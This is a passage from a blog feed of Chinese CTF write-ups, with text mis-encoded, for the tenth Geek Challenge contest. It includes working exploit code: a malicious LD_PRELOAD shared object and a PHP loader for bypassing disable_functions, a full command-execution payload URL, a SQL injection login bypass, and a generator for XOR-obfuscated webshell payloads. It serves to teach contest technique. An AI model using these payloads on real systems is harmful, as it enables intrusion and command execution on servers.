src="/2019/10/bypass-disable-functions/image-20191030172344903.png" alt="image-20191030172344903"></p><p>æ‰€ä»¥ç»•è¿‡disable_functions,å¯ä»¥é€šè¿‡ä¸Šä¼ æ¶æ„soæ–‡ä»¶ï¼ŒåŠ«æŒgetuid(),è¾¾åˆ°å‘½ä»¤æ‰§è¡Œç›®çš„ã€‚ä¹‹æ‰€ä»¥åŠ«æŒ getuid()ï¼Œæ˜¯å› ä¸º sendmail  ç¨‹åºä¼šè°ƒç”¨è¯¥å‡½æ•°ï¼ˆå½“ç„¶ä¹Ÿå¯ä»¥ä¸ºå…¶ä»–è¢«è°ƒç”¨çš„ç³»ç»Ÿå‡½æ•°ï¼‰</p><p>ä½†æ˜¯è¿™ç§åŠ«æŒå‡½æ•°çš„åšæ³•æœ‰å¾ˆå¤§çš„ç¼ºé™·ï¼š</p><p>â€‹    ä¸€æ˜¯ï¼ŒæŸäº›ç¯å¢ƒä¸­ï¼Œweb ç¦æ­¢å¯ç”¨  senmailã€ç”šè‡³ç³»ç»Ÿä¸Šæ ¹æœ¬æœªå®‰è£… sendmailï¼Œä¹Ÿå°±è°ˆä¸ä¸ŠåŠ«æŒ getuid()ï¼Œé€šå¸¸çš„ www-data æƒé™åˆä¸å¯èƒ½å»æ›´æ”¹  php.ini é…ç½®ã€å»å®‰è£… sendmail è½¯ä»¶ï¼›äºŒæ˜¯ï¼Œå³ä¾¿ç›®æ ‡å¯ä»¥å¯ç”¨ sendmailï¼Œç”±äºæœªå°†ä¸»æœºåï¼ˆhostname è¾“å‡ºï¼‰æ·»åŠ è¿›  hosts ä¸­ï¼Œå¯¼è‡´æ¯æ¬¡è¿è¡Œ sendmail éƒ½è¦è€—æ—¶åŠåˆ†é’Ÿç­‰å¾…åŸŸåè§£æè¶…æ—¶è¿”å›ï¼Œwww-data ä¹Ÿæ— æ³•å°†ä¸»æœºååŠ å…¥  hostsï¼ˆå¦‚ï¼Œ127.0.0.1    lampã€lamp.ã€lamp.comï¼‰ </p><h4 id="C-è¯­è¨€æ‰©å±•ä¿®é¥°ç¬¦"><a href="#C-è¯­è¨€æ‰©å±•ä¿®é¥°ç¬¦" class="headerlink" title="C è¯­è¨€æ‰©å±•ä¿®é¥°ç¬¦"></a>C è¯­è¨€æ‰©å±•ä¿®é¥°ç¬¦</h4><p>å›åˆ° LD_PRELOAD æœ¬èº«ï¼Œç³»ç»Ÿé€šè¿‡å®ƒé¢„å…ˆåŠ è½½å…±äº«å¯¹è±¡ï¼Œå¦‚æœèƒ½æ‰¾åˆ°ä¸€ä¸ªæ–¹å¼ï¼Œåœ¨åŠ è½½æ—¶å°±æ‰§è¡Œä»£ç ï¼Œè€Œä¸ç”¨è€ƒè™‘åŠ«æŒæŸä¸€ç³»ç»Ÿå‡½æ•°ï¼Œé‚£å°±å®Œå…¨å¯ä»¥ä¸ä¾èµ– sendmail äº† </p><p> GCC æœ‰ä¸ª C è¯­è¨€æ‰©å±•ä¿®é¥°ç¬¦ <code>__attribute__((constructor))</code>ï¼Œå¯ä»¥è®©ç”±å®ƒä¿®é¥°çš„å‡½æ•°åœ¨ main() ä¹‹å‰æ‰§è¡Œï¼Œè‹¥å®ƒå‡ºç°åœ¨å…±äº«å¯¹è±¡ä¸­æ—¶ï¼Œé‚£ä¹ˆä¸€æ—¦å…±äº«å¯¹è±¡è¢«ç³»ç»ŸåŠ è½½ï¼Œç«‹å³å°†æ‰§è¡Œ <code>__attribute__((constructor))</code> ä¿®é¥°çš„å‡½æ•°ã€‚è¿™ä¸€ç»†èŠ‚éå¸¸é‡è¦ï¼Œå¾ˆå¤šæœ‹å‹ç”¨ LD_PRELOAD æ‰‹æ³•çªç ´ disable_functions æ— æ³•åšåˆ°ç™¾åˆ†ç™¾æˆåŠŸï¼Œæ­£å› ä¸ºè¿™ä¸ªåŸå› ï¼Œ<strong>ä¸è¦å±€é™äºä»…åŠ«æŒæŸä¸€å‡½æ•°ï¼Œè€Œåº”è€ƒè™‘æ‹¦åŠ«å¯åŠ¨è¿›ç¨‹è¿™ä¸€è¡Œä¸º</strong>ã€‚ </p><p> æ­¤å¤–ï¼Œé€šè¿‡ LD_PRELOAD åŠ«æŒäº†å¯åŠ¨è¿›ç¨‹çš„è¡Œä¸ºï¼ŒåŠ«æŒååˆå¯åŠ¨äº†å¦å¤–çš„æ–°è¿›ç¨‹ï¼Œè‹¥ä¸åœ¨æ–°è¿›ç¨‹å¯åŠ¨å‰å–æ¶ˆ LD_PRELOADï¼Œåˆ™å°†é™·å…¥æ— é™å¾ªç¯ï¼Œæ‰€ä»¥å¿…é¡»å¾—åˆ é™¤ç¯å¢ƒå˜é‡ LD_PRELOADã€‚æœ€ç›´è§‚çš„åšæ³•æ˜¯è°ƒç”¨ <code>unsetenv(&quot;LD_PRELOAD&quot;)</code> </p><h4 id="putenv"><a href="#putenv" class="headerlink" title="putenv"></a>putenv</h4><p>PHPä¸­putenv()å‡½æ•°ç”¨äºè®¾ç½®æœåŠ¡å™¨ç¯å¢ƒå˜é‡ï¼Œä»…å­˜æ´»äºå½“å‰è¯·æ±‚æœŸé—´ã€‚ åœ¨è¯·æ±‚ç»“æŸæ—¶ç¯å¢ƒä¼šæ¢å¤åˆ°åˆå§‹çŠ¶æ€ã€‚</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">putenv</span> ( <span class="keyword">string</span> $setting ) : bool</span><br></pre></td></tr></table></figure><p>å¦‚</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">putenv(<span class="string">"LD_PRELOAD=/tmp/evil.so"</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure><h4 id="åŠ«æŒå…±äº«åº“ç»•è¿‡disable-functions"><a href="#åŠ«æŒå…±äº«åº“ç»•è¿‡disable-functions" class="headerlink" title="åŠ«æŒå…±äº«åº“ç»•è¿‡disable_functions"></a>åŠ«æŒå…±äº«åº“ç»•è¿‡disable_functions</h4><p>æŠŠreadflagä¸‹è½½åˆ°æœ¬åœ° IDAåç¼–è¯‘</p><p> <img src="/2019/10/bypass-disable-functions/1571502795907.png" alt="1571502795907"></p><p>bypass.cæ–‡ä»¶ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span>** environ; <span class="comment">//è·å–ç¯å¢ƒå˜é‡</span></span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">preload</span> <span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* cmdline = getenv(<span class="string">"EVIL_CMDLINE"</span>);</span><br><span class="line">    <span class="comment">//è·å–EVIL_CMDLINEçš„å€¼</span></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="comment">//ä»ç¯å¢ƒå˜é‡ä¸­éå†â€œLD_PRELOADâ€çš„ä½ç½®ï¼Œå¹¶å°†å…¶å€¼è®¾ä¸ºNULLã€‚</span></span><br><span class="line">    <span class="comment">//ä»è€Œä½¿ä¸‹é¢çš„system()æ­£å¸¸æ‰§è¡Œã€‚</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; environ[i]; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">strstr</span>(environ[i], <span class="string">"LD_PRELOAD"</span>)) &#123;</span><br><span class="line">                    environ[i][<span class="number">0</span>] = <span class="string">'\0'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ‰§è¡Œå‘½ä»¤</span></span><br><span class="line">    system(cmdline);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -fPIC bypass.c -o bypass_x64.so</span><br></pre></td></tr></table></figure><p>bypass.php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so &lt;/p&gt;"</span>;</span><br><span class="line">    $cmd = $_GET[<span class="string">"cmd"</span>];</span><br><span class="line">    $out_path = $_GET[<span class="string">"outpath"</span>];</span><br><span class="line">    $evil_cmdline = $cmd . <span class="string">" &gt; "</span> . $out_path . <span class="string">" 2&gt;&amp;1"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: "</span> . $evil_cmdline . <span class="string">"&lt;/p&gt;"</span>;</span><br><span class="line">    putenv(<span class="string">"EVIL_CMDLINE="</span> . $evil_cmdline); <span class="comment">//è®¾ç½®EVIL_CMDLINEç¯å¢ƒå˜é‡</span></span><br><span class="line">    $so_path = $_GET[<span class="string">"sopath"</span>];</span><br><span class="line">    putenv(<span class="string">"LD_PRELOAD="</span> . $so_path);  <span class="comment">//åŠ è½½æ¶æ„åŠ¨æ€åº“</span></span><br><span class="line">    mail(<span class="string">""</span>, <span class="string">""</span>, <span class="string">""</span>, <span class="string">""</span>);  <span class="comment">//åˆ©ç”¨mailå‡½æ•°è§¦å‘æ¶æ„å‡½æ•°ï¼Œè·³è½¬è‡³__attribute__ ((__constructor__))ä¿®é¥°çš„å‡½æ•°ã€‚</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;"</span> . nl2br(file_get_contents($out_path)) . <span class="string">"&lt;/p&gt;"</span>; </span><br><span class="line">    unlink($out_path);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æœ€ç»ˆpayloadä¸º</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//114.116.44.23:40001/?code=$_=%22`&#123;&#123;&#123;%22^%22?%3C%3E/%22;$&#123;$_&#125;[_]($&#123;$_&#125;[__]);&amp;_=assert&amp;__=eval($_GET[a])&amp;a=include(%27/tmp/bypass.php%27);&amp;cmd=./../../../readflag&amp;outpath=/tmp/123.txt&amp;sopath=/tmp/bypass_x64.so</span></span><br></pre></td></tr></table></figure><p><img src="/2019/10/bypass-disable-functions/image-20191103123740141.png" alt="image-20191103123740141"></p><p><a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD" target="_blank" rel="noopener">å‚è€ƒæ–‡ç« 1</a></p><p><a href="https://www.cnblogs.com/leixiao-/p/10612798.html" target="_blank" rel="noopener">å‚è€ƒæ–‡ç« 2</a></p>]]></content>
    
    <summary type="html">
    
      ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜RCE_MEåˆ†æ
    
    </summary>
    
    
      <category term="CTF" scheme="https://0xcreed.jxustctf.top/categories/CTF/"/>
    
    
      <category term="PHP" scheme="https://0xcreed.jxustctf.top/tags/PHP/"/>
    
      <category term="BYPASS_DISABLE_FUNCTIONS" scheme="https://0xcreed.jxustctf.top/tags/BYPASS-DISABLE-FUNCTIONS/"/>
    
  </entry>
  
  <entry>
    <title>ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up</title>
    <link href="https://0xcreed.jxustctf.top/2019/10/%E7%AC%AC%E5%8D%81%E5%B1%8A%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98Write-up/"/>
    <id>https://0xcreed.jxustctf.top/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/</id>
    <published>2019-10-18T01:22:57.000Z</published>
    <updated>2020-04-12T10:25:42.612Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="æ‰“æ¯”èµ›å‰å…ˆæ’¸ä¸€åªçŒ«ï¼-çŒ«çŒ«é™ªæˆ‘æ‰“ctfï¼"><a href="#æ‰“æ¯”èµ›å‰å…ˆæ’¸ä¸€åªçŒ«ï¼-çŒ«çŒ«é™ªæˆ‘æ‰“ctfï¼" class="headerlink" title="æ‰“æ¯”èµ›å‰å…ˆæ’¸ä¸€åªçŒ«ï¼: çŒ«çŒ«é™ªæˆ‘æ‰“ctfï¼"></a>æ‰“æ¯”èµ›å‰å…ˆæ’¸ä¸€åªçŒ«ï¼: çŒ«çŒ«é™ªæˆ‘æ‰“ctfï¼</h2><p>å¼€å±€ä¸€åªçŒ«ï¼Œflagå…¨é æ¡ -_-</p><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/1571363272606.png" alt="1571363272606"></p><p>ç›´æ¥F12 æŸ¥çœ‹æºç </p><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/1571363339663.png" alt="1571363339663"></p><p>ç›´æ¥æäº¤cat=dog</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://118.25.14.40:8110/?cat=dog</span><br></pre></td></tr></table></figure><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/1571363481025.png" alt="1571363481025"></p><h2 id="ä½ çœ‹è§è¿‡æˆ‘çš„èœåˆ€ä¹ˆ"><a href="#ä½ çœ‹è§è¿‡æˆ‘çš„èœåˆ€ä¹ˆ" class="headerlink" title="ä½ çœ‹è§è¿‡æˆ‘çš„èœåˆ€ä¹ˆ"></a>ä½ çœ‹è§è¿‡æˆ‘çš„èœåˆ€ä¹ˆ</h2><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/1571363676296.png" alt="1571363676296"></p><p>ç¡®å®æ˜¯ç™½ç»™çš„shell</p><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/1571373932241.png" alt="1571373932241"></p><p>â€‹       æ ¹ç›®å½•ä¸‹å‘ç°flagç›®å½•ä¸‹çš„flag.txt<br>â€‹<br>â€‹             <img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/1571374018594.png" alt="1571374018594"><br>â€‹<br>â€‹<br>â€‹    </p><a id="more"></a><h2 id="BurpSuiiiiiit-æ‹¿èµ·ä½ çš„burpï¼Œå¼€å§‹æˆ˜æ–—å§"><a href="#BurpSuiiiiiit-æ‹¿èµ·ä½ çš„burpï¼Œå¼€å§‹æˆ˜æ–—å§" class="headerlink" title="BurpSuiiiiiit!!!: æ‹¿èµ·ä½ çš„burpï¼Œå¼€å§‹æˆ˜æ–—å§"></a>BurpSuiiiiiit!!!: æ‹¿èµ·ä½ çš„burpï¼Œå¼€å§‹æˆ˜æ–—å§</h2><p>é™„ä»¶ä¸‹è½½ä¸‹æ¥ï¼Œè§£å‹å¾—åˆ°Extender.jaræ–‡ä»¶</p><p>ä»åå­—å’Œæ ¼å¼çœ‹åº”è¯¥BurpSuitçš„æ‰©å±•åŒ…ï¼Œç”¨BPå¯¼å…¥</p><p>â€‹      <img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/1571495641219.png" alt="1571495641219"></p><p>â€‹      <img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/1571374457080.png" alt="1571374457080"><br>â€‹<br>â€‹              å¯¼å…¥å¤±è´¥ï¼Œå¹¶æç¤ºæˆ‘ä»¬æŸ¥çœ‹errorsé¡µé¢<br>â€‹<br>â€‹             <img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/1571374537984.png" alt="1571374537984"></p><p>â€‹        flagç›´æ¥å°±å‡ºæ¥äº†</p><h2 id="æ€§æ„Ÿæ½‡æ–‡æ¸…ï¼Œåœ¨çº¿ç®—å¦ï¼šåŠ¨ä½œå¿«ç‚¹æ‰èƒ½ç®—åˆ°å¥½å¦ã€‚"><a href="#æ€§æ„Ÿæ½‡æ–‡æ¸…ï¼Œåœ¨çº¿ç®—å¦ï¼šåŠ¨ä½œå¿«ç‚¹æ‰èƒ½ç®—åˆ°å¥½å¦ã€‚" class="headerlink" title="æ€§æ„Ÿæ½‡æ–‡æ¸…ï¼Œåœ¨çº¿ç®—å¦ï¼šåŠ¨ä½œå¿«ç‚¹æ‰èƒ½ç®—åˆ°å¥½å¦ã€‚"></a>æ€§æ„Ÿæ½‡æ–‡æ¸…ï¼Œåœ¨çº¿ç®—å¦ï¼šåŠ¨ä½œå¿«ç‚¹æ‰èƒ½ç®—åˆ°å¥½å¦ã€‚</h2><p>è¾“å…¥å§“åå’Œç”Ÿæ—¥åï¼Œè¿”å›äº†ä¸€ä¸ªè·¯å¾„</p><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/1571374815419.png" alt="1571374815419"></p><p>ç›´æ¥è®¿é—®è¯•ä¸‹</p><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/1571374878503.png" alt="1571374878503"></p><p>å›åˆ°ä¸»é¡µï¼ŒæŸ¥çœ‹æºç </p><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/1571374951634.png" alt="1571374951634"></p><p>æç¤ºæˆ‘ä»¬æ¡ä»¶ç«äº‰ï¼Œä»æºç çœ‹æˆ‘ä»¬è¾“å…¥uå’Œpåï¼Œflagä¼šå†™å…¥åˆ°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$savepath<span class="string">" . sha1($_GET['u'])</span></span><br></pre></td></tr></table></figure><p>â€‹        0.1såå†æŠŠflagæ¢æˆ you are too slow</p><p>â€‹        æ‰€ä»¥æˆ‘ä»¬å…ˆä¸€ç›´è®¿é—®å­˜åœ¨flagçš„è¿™ä¸ªæ–‡ä»¶ï¼Œç„¶ååœ¨æäº¤uå’Œpï¼Œåœ¨flagç”Ÿæˆçš„ä¸€ç¬é—´æŠŠå®ƒè¯»å–</p><p>â€‹        ç›´æ¥ä¸Šburpsuit</p><p>â€‹    <img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/1571375619875.png" alt="1571375619875"></p><p>â€‹    <img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/1571376044998.png" alt="1571376044998"></p><p>â€‹    payloadè®¾ç½®ä¸ºç©ºï¼Œæ•°é‡200ä¸ªã€‚</p><p>â€‹    <img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/1571375724646.png" alt="1571375724646"></p><p>â€‹    <img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/1571375756868.png" alt="1571375756868"></p><p>â€‹    payloadåŒæ ·ä¸ºç©ºï¼Œæ•°é‡ä¸º1.</p><p>â€‹    2æ”»å‡»åï¼Œ3ç«‹é©¬æ”»å‡»</p><p>â€‹    <img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/1571375974330.png" alt="1571375974330"></p><p>â€‹    å¾—åˆ°flag</p><h2 id="Easysql-æœ€è¿‘æˆ‘åšäº†ä¸€ä¸ªå°ç½‘ç«™ï¼Œæˆ‘æŠŠflagæ”¾åœ¨é‡Œé¢äº†ï¼Œä¸è¿‡æˆ‘æ²¡æœ‰æŠŠç™»é™†å¯†ç å‘Šè¯‰ä»»ä½•äººï¼Œæ‰€ä»¥ä½ ä»¬æ˜¯æ‹¿ä¸åˆ°flagçš„ï¼"><a href="#Easysql-æœ€è¿‘æˆ‘åšäº†ä¸€ä¸ªå°ç½‘ç«™ï¼Œæˆ‘æŠŠflagæ”¾åœ¨é‡Œé¢äº†ï¼Œä¸è¿‡æˆ‘æ²¡æœ‰æŠŠç™»é™†å¯†ç å‘Šè¯‰ä»»ä½•äººï¼Œæ‰€ä»¥ä½ ä»¬æ˜¯æ‹¿ä¸åˆ°flagçš„ï¼" class="headerlink" title="Easysql: æœ€è¿‘æˆ‘åšäº†ä¸€ä¸ªå°ç½‘ç«™ï¼Œæˆ‘æŠŠflagæ”¾åœ¨é‡Œé¢äº†ï¼Œä¸è¿‡æˆ‘æ²¡æœ‰æŠŠç™»é™†å¯†ç å‘Šè¯‰ä»»ä½•äººï¼Œæ‰€ä»¥ä½ ä»¬æ˜¯æ‹¿ä¸åˆ°flagçš„ï¼"></a>Easysql: æœ€è¿‘æˆ‘åšäº†ä¸€ä¸ªå°ç½‘ç«™ï¼Œæˆ‘æŠŠflagæ”¾åœ¨é‡Œé¢äº†ï¼Œä¸è¿‡æˆ‘æ²¡æœ‰æŠŠç™»é™†å¯†ç å‘Šè¯‰ä»»ä½•äººï¼Œæ‰€ä»¥ä½ ä»¬æ˜¯æ‹¿ä¸åˆ°flagçš„ï¼</h2><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/1571386357741.png" alt="1571386357741"></p><p>ä»€ä¹ˆé˜²æŠ¤éƒ½æ²¡æœ‰ </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">'='</span><br><span class="line">'='</span><br></pre></td></tr></table></figure><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/1571387426532.png" alt="1571387426532">    </p><p>ç›´æ¥è¿›åå°</p><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/1571387449879.png" alt="1571387449879"></p><h2 id="RCE-me-I-donâ€™t-think-U-can-system-RCE-prove-to-me"><a href="#RCE-me-I-donâ€™t-think-U-can-system-RCE-prove-to-me" class="headerlink" title="RCE me: I donâ€™t think U can system RCE, prove to me"></a>RCE me: I donâ€™t think U can system RCE, prove to me</h2><p>è¿™é“é¢˜å­¦åˆ°äº†å¾ˆå¤šï¼</p><p>æ‰“å¼€ç½‘é¡µçœ‹çœ‹</p><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/1571495997995.png" alt="1571495997995"></p><p>GETä¼ å‚codeï¼Œcodeä¸­ä¸èƒ½æœ‰A-Zï¼Œa-zï¼Œ0-9ï¼Œè¿™äº›å­—ç¬¦ï¼Œè€Œä¸”å­—ç¬¦é™åˆ¶åœ¨40ä¸ªå­—ç¬¦</p><p>æ‰€ä»¥æˆ‘ä»¬è¦å…ˆç»•è¿‡è¿™ä¸ªé™åˆ¶ï¼Œæ‰§è¡Œå‘½ä»¤ã€‚</p><p>å‚è€ƒ<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener">pç¥</a>ä¸å«æ•°å­—å’Œå­—æ¯çš„webshell</p><p>æ„é€ è„šæœ¬ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gen</span><span class="params">($pl)</span> </span>&#123;</span><br><span class="line">    $aa = <span class="string">""</span>;</span><br><span class="line">    $bb = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">for</span> ($j = <span class="number">0</span>; $j &lt; strlen($pl); $j++) &#123;</span><br><span class="line">        <span class="keyword">for</span> ($i = <span class="number">0xa0</span>; $i &lt; <span class="number">0xff</span>; $i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (preg_match(<span class="string">'/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i'</span>, chr($i)) == <span class="number">0</span>) &#123;</span><br><span class="line">                $t = chr($i) ^ $pl[$j];</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">'/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i'</span>, $t) == <span class="number">0</span>) &#123;</span><br><span class="line">                    $aa .= chr($i);</span><br><span class="line">                    $bb .= $t;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">"%"</span>, <span class="string">"\x"</span>, urlencode($aa) . <span class="string">"^"</span> . urlencode($bb) . <span class="string">"\r\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gen_url</span><span class="params">($pl)</span> </span>&#123;</span><br><span class="line">    $aa = <span class="string">""</span>;</span><br><span class="line">    $bb = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">for</span> ($j = <span class="number">0</span>; $j &lt; strlen($pl); $j++) &#123;</span><br><span class="line">        <span class="keyword">for</span> ($i = <span class="number">0xa0</span>; $i &lt; <span class="number">0xff</span>; $i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (preg_match(<span class="string">'/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i'</span>, chr($i)) == <span class="number">0</span>) &#123;</span><br><span class="line">                $t = chr($i) ^ $pl[$j];</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">'/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i'</span>, $t) == <span class="number">0</span>) &#123;</span><br><span class="line">                    $aa .= chr($i);</span><br><span class="line">                    $bb .= $t;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> urlencode($aa) . <span class="string">"^"</span> . urlencode($bb). <span class="string">"\r\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> gen(<span class="string">"_GET"</span>);</span><br><span class="line"><span class="keyword">echo</span> gen_url(<span class="string">"_GET"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\xA0\xA0\xA0\xA0"</span>^<span class="string">"\xFF\xE7\xE5\xF4"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> urldecode(<span class="string">"%A0%A0%A0%A0"</span>)^urldecode(<span class="string">"%FF%E7%E5%F4"</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br></pre></td></tr></table></figure><p>æ„é€ å¦‚ä¸‹URl</p><figure class="highlight"><table><tr><td class="gutter"><pre><span 